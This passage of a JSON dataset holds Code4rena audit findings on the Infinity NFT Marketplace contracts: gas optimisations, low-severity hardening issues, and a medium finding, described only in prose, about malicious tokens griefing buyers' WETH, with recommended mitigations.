threshold](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L351)\\\n[uint16 threeMonthPenalty,uint16 sixMonthPenalty,uint16 twelveMonthPenalty](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L365-L367)\\\n[address \\_infinityTreasury](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L375)\n\n### Mitigation\n\nAdd a comment for these parameters\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "5533",
      "title": "[G-15] Using `private` rather than `public` for constants, saves gas",
      "impact": "GAS",
      "content": "\nIf needed, the value can be read from the verified contract source code. Saves **3406-3606 gas** in deployment gas due to the compiler not having to create non-payable getter functions for deployment calldata, not having to store the bytes of the value outside of where it's used, and not adding another entry to the method ID table\n\n*There are 5 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-15-using-private-rather-than-public-for-constants-saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5532",
      "title": "[G-11] `>=` costs less gas than `>`",
      "impact": "GAS",
      "content": "\nThe compiler uses opcodes `GT` and `ISZERO` for solidity code that uses `>`, but only requires `LT` for `>=`, [which saves **3 gas**](https://gist.github.com/IllIllI000/3dc79d25acccfa16dee4e83ffdc6ffde)\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/token/InfinityToken.sol   #1\n\n67        epochsPassedSinceLastAdvance = epochsPassedSinceLastAdvance > epochsLeft\n68          ? epochsLeft\n69:         : epochsPassedSinceLastAdvance;\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/token/InfinityToken.sol#L67-L69>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-11--costs-less-gas-than-",
      "tags": [],
      "finders": []
    },
    {
      "id": "5531",
      "title": "[G-10] Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement",
      "impact": "GAS",
      "content": "\nThis change saves **[6 gas](https://aws1.discourse-cdn.com/business6/uploads/zeppelin/original/2X/3/363a367d6d68851f27d2679d10706cd16d788b96.png)** per instance. The optimization works until solidity version [0.8.13](https://gist.github.com/IllIllI000/bf2c3120f24a69e489f12b3213c06c94) where there is a regression in gas costs.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/core/InfinityExchange.sol   #1\n\n392:      require(numNonces > 0, 'cannot be empty');\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L392>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-10-using--0-costs-more-gas-than--0-when-used-on-a-uint-in-a-require-statement",
      "tags": [],
      "finders": []
    },
    {
      "id": "5530",
      "title": "[G-09] Using `bool`s for storage incurs overhead",
      "impact": "GAS",
      "content": "\n```solidity\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n```\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27><br>\nUse `uint256(1)` and `uint256(2)` for true/false to avoid a Gwarmaccess (**[100 gas](https://gist.github.com/IllIllI000/1b70014db712f8572a72378321250058)**) for the extra SLOAD, and to avoid Gsset (**20000 gas**) when changing from 'false' to 'true', after having been 'true' in the past\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/core/InfinityExchange.sol   #1\n\n73:     mapping(address => mapping(uint256 => bool)) public isUserOrderNonceExecutedOrCancelled;\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L73>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-09-using-bools-for-storage-incurs-overhead",
      "tags": [],
      "finders": []
    },
    {
      "id": "5529",
      "title": "[G-08] `require()`/`revert()` strings longer than 32 bytes cost extra gas",
      "impact": "GAS",
      "content": "\nEach extra memory word of bytes past the original 32 [incurs an MSTORE](https://gist.github.com/hrkrshnn/ee8fabd532058307229d65dcd5836ddc#consider-having-short-revert-strings) which costs **3 gas**\n\n*There are 3 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-08-requirerevert-strings-longer-than-32-bytes-cost-extra-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "5528",
      "title": "[G-06] `internal` functions only called once can be inlined to save gas",
      "impact": "GAS",
      "content": "\nNot inlining costs **20 to 40 gas** because of two extra `JUMP` instructions and additional stack operations needed for function calls.\n\n*There are 22 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-06-internal-functions-only-called-once-can-be-inlined-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4963",
      "title": "[G-19] Functions guaranteed to revert when called by normal users can be marked `payable`",
      "impact": "GAS",
      "content": "\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as `payable` will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are\n`CALLVALUE`(2),`DUP1`(3),`ISZERO`(3),`PUSH2`(3),`JUMPI`(10),`PUSH1`(3),`DUP1`(3),`REVERT`(0),`JUMPDEST`(1),`POP`(2), which costs an average of about **21 gas per call** to the function, in addition to the extra deployment cost\n\n*There are 13 instances of this issue.*\n\n**[nneverlander (Infinity) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/186#issuecomment-1163502067):**\n > Thank you for the detailed report.\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/186#issuecomment-1184785713):**\n > 🔥 \n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-19-functions-guaranteed-to-revert-when-called-by-normal-users-can-be-marked-payable",
      "tags": [],
      "finders": []
    },
    {
      "id": "4962",
      "title": "[G-18] Use custom errors rather than `revert()`/`require()` strings to save gas",
      "impact": "GAS",
      "content": "\nCustom errors are available from solidity version 0.8.4. Custom errors save [**\\~50 gas**](https://gist.github.com/IllIllI000/ad1bd0d29a0101b25e57c293b4b0c746) each time they're hitby [avoiding having to allocate and store the revert string](https://blog.soliditylang.org/2021/04/21/custom-errors/#errors-in-depth). Not defining the strings also save deployment gas\n\n*There are 47 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-18-use-custom-errors-rather-than-revertrequire-strings-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4961",
      "title": "[G-17] Empty blocks should be removed or emit something",
      "impact": "GAS",
      "content": "\nThe code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be `abstract` and the function signatures be added without any default implementation. If the block is an empty `if`-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (`if(x){}else if(y){...}else{...}` => `if(!x){if(y){...}else{...}}`)\n\n*There are 4 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-17-empty-blocks-should-be-removed-or-emit-something",
      "tags": [],
      "finders": []
    },
    {
      "id": "4960",
      "title": "[G-16] Duplicated `require()`/`revert()` checks should be refactored to a modifier or function",
      "impact": "GAS",
      "content": "\nSaves deployment costs\n\n*There are 6 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-16-duplicated-requirerevert-checks-should-be-refactored-to-a-modifier-or-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "4958",
      "title": "[G-14] Usage of `uints`/`ints` smaller than 32 bytes (256 bits) incurs overhead",
      "impact": "GAS",
      "content": "\n> When using elements that are smaller than 32 bytes, your contract’s gas usage may be higher. This is because the EVM operates on 32 bytes at a time. Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size.\n\n<https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html>\nUse a larger size then downcast where needed\n\n*There are 39 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-14-usage-of-uintsints-smaller-than-32-bytes-256-bits-incurs-overhead",
      "tags": [],
      "finders": []
    },
    {
      "id": "4957",
      "title": "[G-13] Splitting `require()` statements that use `&&` saves gas",
      "impact": "GAS",
      "content": "\nSee [this issue](https://github.com/code-423n4/2022-01-xdefi-findings/issues/128) which describes the fact that there is a larger deployment gas cost, but with enough runtime calls, the change ends up being cheaper\n\n*There are 2 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-13-splitting-require-statements-that-use--saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4956",
      "title": "[G-12] It costs more gas to initialize non-`constant`/non-`immutable` variables to zero than to let the default of zero be applied",
      "impact": "GAS",
      "content": "\nNot overwriting the default for [stack variables](https://gist.github.com/IllIllI000/e075d189c1b23dce256cd166e28f3397) saves **8 gas**. Storage and memory variables have larger savings\n\n*There are 26 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-12-it-costs-more-gas-to-initialize-non-constantnon-immutable-variables-to-zero-than-to-let-the-default-of-zero-be-applied",
      "tags": [],
      "finders": []
    },
    {
      "id": "4951",
      "title": "[G-07] Add `unchecked {}` for subtractions where the operands cannot underflow because of a previous `require()` or `if`-statement",
      "impact": "GAS",
      "content": "\n`require(a <= b); x = b - a` => `require(a <= b); unchecked { x = b - a }`\n\n*There are 3 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-07-add-unchecked--for-subtractions-where-the-operands-cannot-underflow-because-of-a-previous-require-or-if-statement",
      "tags": [],
      "finders": []
    },
    {
      "id": "4949",
      "title": "[G-05] Multiple accesses of a mapping/array should use a local variable cache",
      "impact": "GAS",
      "content": "\nThe instances below point to the second+ access of a value inside a mapping/array, within a function. Caching a mapping's value in a local `storage` or `calldata` variable when the value is accessed [multiple times](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0), saves **\\~42 gas per access** due to not having to recalculate the key's keccak256 hash (Gkeccak256 - **30 gas**) and that calculation's associated stack operations. Caching an array's struct avoids recalculating the array offsets into memory/calldata\n\n*There are 13 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-05-multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache",
      "tags": [],
      "finders": []
    },
    {
      "id": "4948",
      "title": "[G-04] State variables should be cached in stack variables rather than re-reading them from storage",
      "impact": "GAS",
      "content": "\nThe instances below point to the second+ access of a state variable within a function. Caching of a state variable replace each Gwarmaccess (**100 gas**) with a much cheaper stack read. Other less obvious fixes/optimizations include having local memory caches of state variable structs, or having local caches of state variable contracts/addresses.\n\n*There are 9 instances of this issue.*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-04-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage",
      "tags": [],
      "finders": []
    },
    {
      "id": "4947",
      "title": "[G-03] State variables can be packed into fewer storage slots",
      "impact": "GAS",
      "content": "\nIf variables occupying the same slot are both written the same function or by the constructor, avoids a separate Gsset (**20000 gas**). Reads of the variables can also be cheaper\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/staking/InfinityStaker.sol   #1\n\n/// @audit Variable ordering with 3 slots instead of the current 4:\n/// @audit  mapping(32):userstakedAmounts, address(20):INFINITY_TOKEN, uint16(2):BRONZE_STAKE_THRESHOLD, uint16(2):SILVER_STAKE_THRESHOLD, uint16(2):GOLD_STAKE_THRESHOLD, uint16(2):PLATINUM_STAKE_THRESHOLD, uint16(2):THREE_MONTH_PENALTY, uint16(2):SIX_MONTH_PENALTY, address(20):INFINITY_TREASURY, uint16(2):TWELVE_MONTH_PENALTY\n23:     mapping(address => mapping(Duration => StakeAmount)) public userstakedAmounts;\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L23>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-03-state-variables-can-be-packed-into-fewer-storage-slots",
      "tags": [],
      "finders": []
    },
    {
      "id": "4946",
      "title": "[G-02] State variables only set in the constructor should be declared `immutable`",
      "impact": "GAS",
      "content": "\nAvoids a Gsset (**20000 gas**) in the constructor, and replaces each Gwarmacces (**100 gas**) with a `PUSH32` (**3 gas**).\n\n*There are 2 instances of this issue. (For in-depth details on this and all further gas optimizations with multiple instances, see the warden's [full report](https://github.com/code-423n4/2022-06-infinity-findings/issues/186).)*\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-02-state-variables-only-set-in-the-constructor-should-be-declared-immutable",
      "tags": [],
      "finders": []
    },
    {
      "id": "4945",
      "title": "[G-01] Multiple `address` mappings can be combined into a single `mapping` of an `address` to a `struct`, where appropriate",
      "impact": "GAS",
      "content": "\nSaves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **\\~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - **30 gas**) and that calculation's associated stack operations.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: contracts/core/InfinityExchange.sol   #1\n\n70      mapping(address => uint256) public userMinOrderNonce;\n71    \n72      /// @dev This records already executed or cancelled orders to prevent replay attacks.\n73:     mapping(address => mapping(uint256 => bool)) public isUserOrderNonceExecutedOrCancelled;\n```\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L70-L73>\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#g-01-multiple-address-mappings-can-be-combined-into-a-single-mapping-of-an-address-to-a-struct-where-appropriate",
      "tags": [],
      "finders": []
    },
    {
      "id": "4944",
      "title": "[L-07] Timelock or maximum amount on updatePenalties",
      "impact": "LOW",
      "content": "\n`updatePenalties()` changes how much a user loses upon \"ragequiting\" - ie withdrawing their tokens from the staker without waiting for the vesting period. It currently does not have any timelock, or any maximum amount: the owner can set the penalties such that a user calling `rageQuit()` loses all their `Infinity` tokens (all would be transferred to `INFINITY_TREASURY`). Adding a timelock would provide more guarantees to users and reduces the level of trust required.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityStaker.sol\n\n[updatePenalties](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L369-L371)\n\n### Mitigation\n\nEither add a timelock to `updatePenalties()`, or add a maximum penalty check.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-07-timelock-or-maximum-amount-on-updatepenalties",
      "tags": [],
      "finders": []
    },
    {
      "id": "4943",
      "title": "[L-06] Setters should check the input value",
      "impact": "LOW",
      "content": "\nSetters should check the input value - ie make revert if it is the zero address or zero\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[function updateMatchExecutor](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1255)\n\n#### InfinityStaker.sol\n\n[function updateStakeLevelThreshold](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L351) There should be a check that the new threshold does not break the following: BRONZE < SILVER < GOLD < PLATINUM\\\n[function updatePenalties](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L364)\\\n[function updateInfinityTreasury](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L375)\n\n### Mitigation\n\nAdd non-zero checks - address or uint - to the setters aforementioned.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-06-setters-should-check-the-input-value",
      "tags": [],
      "finders": []
    },
    {
      "id": "4942",
      "title": "[L-05] Receive function",
      "impact": "LOW",
      "content": "\nInfinityStaker.sol is not supposed to receive ETH. Instead of using a rescue function, remove `receive()` and `fallback()` altogether.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityStaker.sol\n\n[fallback() external payable](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L55)\\\n[receive() external payable](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L57)\\\n[function rescueETH(address destination) external payable](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L345)\n\n### Mitigation\n\nRemove these functions, or include a call to `rescueETH` in `receive()`, so that a user that mistakenly sends ETH to the Staker retrieves it immediately.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-05-receive-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "4941",
      "title": "[L-04] Payable functions when using ERC20",
      "impact": "LOW",
      "content": "\nThere should be a `require(0 == msg.value)` to ensure no Ether is being sent to the exchange when the currency used in an order is a ERC20 token.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\nscope: `takeMultipleOneOrders`\n\n*   When [`!isMakerSeller`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L305-L307), there is no check to see if `msg.value == 0`\n\nscope: `takeOrders`\n\n*   When [`!isMakerSeller`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L346-L348), there is no check to see if `msg.value == 0`\n\n### Mitigation\n\nAdd `require(0 == msg.value)` in both condition blocks mentioned above.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-04-payable-functions-when-using-erc20",
      "tags": [],
      "finders": []
    },
    {
      "id": "4940",
      "title": "[L-03] Immutable addresses lack zero-address check",
      "impact": "LOW",
      "content": "\nConstructors should check the address written in an immutable address variable is not the zero address\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\n[WETH = \\_WETH](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L115)\n\n### Mitigation\n\nAdd a zero address check for `_WETH`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-03-immutable-addresses-lack-zero-address-check",
      "tags": [],
      "finders": []
    },
    {
      "id": "4939",
      "title": "[L-02] Check zero denominator",
      "impact": "LOW",
      "content": "\nWhen a division is computed, it must be ensured that the denominator is non-zero to prevent failure of the function call.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityStaker.sol\n\n[((threeMonthLock - threeMonthVested) / THREE_MONTH_PENALTY)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L196)\\\n[((sixMonthLock - sixMonthVested) / SIX_MONTH_PENALTY)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L197)\\\n[((twelveMonthLock - twelveMonthVested) / TWELVE_MONTH_PENALTY)](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L198)\n\nAll these storage variables in the denominators are set by the owner in `updatePenalties()`, and can be `0` as there is no non-zero check.\n\n### Mitigation\n\nBefore doing these computations, add a non-zero check to these variables. Or alternatively, add a non-zero check in\n`updatePenalties()`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-02-check-zero-denominator",
      "tags": [],
      "finders": []
    },
    {
      "id": "4938",
      "title": "[L-01] Event should be emitted in setters",
      "impact": "LOW",
      "content": "\nSetters should emit an event so that Dapps can detect important changes to storage.\n\n### Proof of Concept\n\nInstances include:\n\n#### InfinityExchange.sol\n\nAll the functions editing the currencies and complications of the exchange should emit an event\\\n[function addCurrency](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1235)\\\n[function addComplication](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1240)\\\n[function removeCurrency](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1235)\\\n[function removeComplication](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1235)\n\n[function updateMatchExecutor](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1255)\n\n#### InfinityStaker.sol\n\n[function updateStakeLevelThreshold](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L351)\\\n[function updatePenalties](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L364)\\\n[function updateInfinityTreasury](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/staking/InfinityStaker.sol#L375)\n\n### Mitigation\n\nEmit an event in all setters.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Infinity NFT Marketplace",
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "#l-01-event-should-be-emitted-in-setters",
      "tags": [],
      "finders": []
    },
    {
      "id": "2786",
      "title": "[M-09] Malicious tokens can be used to grief buyers and cause loss of their WETH balance",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xalpharush_\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L739-L746>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L727>\n\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1087>\n\n### Impact\n\nThe function `matchOneToOneOrders` transfers an arbitrary amount of WETH from the user, `buy.signer` ,  in its inner call to `_execMatchOneToOneOrders`. The amount charged to the user is calculated dynamically based off of the gas consumption consumed during the trace. Notably, this amount is controlled by the seller since the seller's token can be malicious and purposefully consume a large amount of gas to grief the buyer. For example, when a user purchases an ERC721 token, the `_transferNFTs` will result in a call to an `ERC721.safeTransferFrom` that can exhibit any behavior such as wasting gas. This scenario is unlikely given that a buyer would have to purchase a malicious token, but the impact would be devastating as any WETH that the buyer has approved to the exchange can be lost.\n\nThis vulnerability is potentially possible in these functions as well:<br>\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L236-L242><br>\n<https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L787-L796>\n\n### Proof of Concept\n\nA buyer gives infinite WETH approval to the exchange contract and unknowingly purchases a malicious token from an attacker. The attacker's token wastes gas in the transfer call and causes *all* of the buyer's WETH to be sent to the protocol when `matchOneToOneOrders` is performed by the match executor.\n\n### Recommended Mitigation Steps\n\nAllow users to input a maximum fee/ gas cost they are willing to spend on each order. Pulling an arbitrary amount from a user's wallet without any restriction is a dangerous practice given that many users give large/ infinite approval to contracts.\n\nIn addition, manual gas accounting is error prone and it would make more sense to allow users to match orders themselves instead of extracting fees to compensate the matcher.\n\n**[nneverlander (Infinity) acknowledged and commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/74#issuecomment-1164323281):**\n > Thanks, we are adding a max price variable\n\n**[HardlyDifficult (judge) commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/74#issuecomment-1181073834):**\n > This is a clever way to leverage safeTransferFrom to grief users. Accepting as Medium 